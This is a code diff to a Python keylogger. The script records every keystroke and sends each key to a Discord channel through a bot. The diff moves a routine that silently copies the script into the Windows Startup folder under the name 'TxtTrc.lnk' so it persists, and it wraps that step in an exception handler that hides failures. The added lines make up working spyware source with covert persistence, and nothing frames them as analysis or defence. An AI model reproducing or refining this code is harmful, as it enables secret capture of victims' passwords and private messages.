@@ -6,7 +6,25 @@ import os
 import shutil
 import sys
 
-string =""
+def add_to_startup():
+    # Get the path to the current script
+    script_path = os.path.abspath(sys.argv[0])
+    
+    # Get the user's startup folder
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    
+    # Define the name of the new shortcut
+    shortcut_name = 'TxtTrc.lnk'
+    shortcut_path = os.path.join(startup_folder, shortcut_name)
+    
+    # Check if the script is already in the startup folder
+    if not os.path.exists(shortcut_path):
+        # Create a shortcut to the script
+        shutil.copy(script_path, shortcut_path)
+try:
+    add_to_startup()
+except:
+    pass
 
 # Replace 'your_token_here' with your actual bot token
 TOKEN = 'your_token_here'
@@ -33,29 +51,10 @@ async def on_ready():
         # Check for any key press
         event = keyboard.read_event()
         if event.event_type == keyboard.KEY_DOWN:
-            string += event.name
-            if len(string) >= 10: #This sends keystrokes in group of 10 (can be adjusted)
-                string = ""
-                await channel.send(string)  # Send the specific key that was pressed
+                await channel.send(event.name)  # Send the specific key that was pressed
         
         time.sleep(0.05)  # Adjust the interval as needed
 
 bot.run(TOKEN)
 
-def add_to_startup():
-    # Get the path to the current script
-    script_path = os.path.abspath(sys.argv[0])
-    
-    # Get the user's startup folder
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    
-    # Define the name of the new shortcut
-    shortcut_name = 'TxtTrc.lnk'
-    shortcut_path = os.path.join(startup_folder, shortcut_name)
-    
-    # Check if the script is already in the startup folder
-    if not os.path.exists(shortcut_path):
-        # Create a shortcut to the script
-        shutil.copy(script_path, shortcut_path)
-        
-add_to_startup()
+
